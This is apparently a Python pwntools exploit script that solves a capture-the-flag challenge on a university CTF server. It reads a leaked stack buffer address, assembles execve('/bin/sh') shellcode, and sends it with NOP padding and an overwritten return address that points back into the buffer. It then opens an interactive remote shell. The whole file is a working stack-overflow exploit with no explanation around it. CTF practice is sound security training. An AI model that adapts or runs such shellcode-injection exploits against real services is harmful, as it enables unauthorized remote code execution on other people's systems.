#!/usr/bin/python3
from pwn import *

# Global constants
SHELLCODE_TEMPLATE = """
    mov sil, 0
    xor rdx, rdx
    mov rdi, rbp
    mov al, 0x3b
    syscall
    """

def initialize_connection(target, port):
    return remote(target, port)

def get_buffer_address(connection):
    connection.recvuntil(b"Address: ")
    buffer_address = int(connection.recvline().strip(), 16)
    log.info("BUFFER START: " + hex(buffer_address))
    return buffer_address

def assemble_shellcode():
    return asm(SHELLCODE_TEMPLATE)

def send_shellcode(connection, shellcode, buffer_address):
    payload = b"/bin/sh\0" + shellcode.ljust(40, b"\x90") + p64(buffer_address) + p64(buffer_address + 8)
    connection.sendlineafter(b"Shellcode: ", payload)

def main():
    context.binary = ELF("chall")
    context.arch = "amd64"

    connection = initialize_connection("ctf99.cs.ui.ac.id", 10012)
    buffer_address = get_buffer_address(connection)

    shellcode = assemble_shellcode()
    send_shellcode(connection, shellcode, buffer_address)

    connection.interactive()

if __name__ == "__main__":
    main()
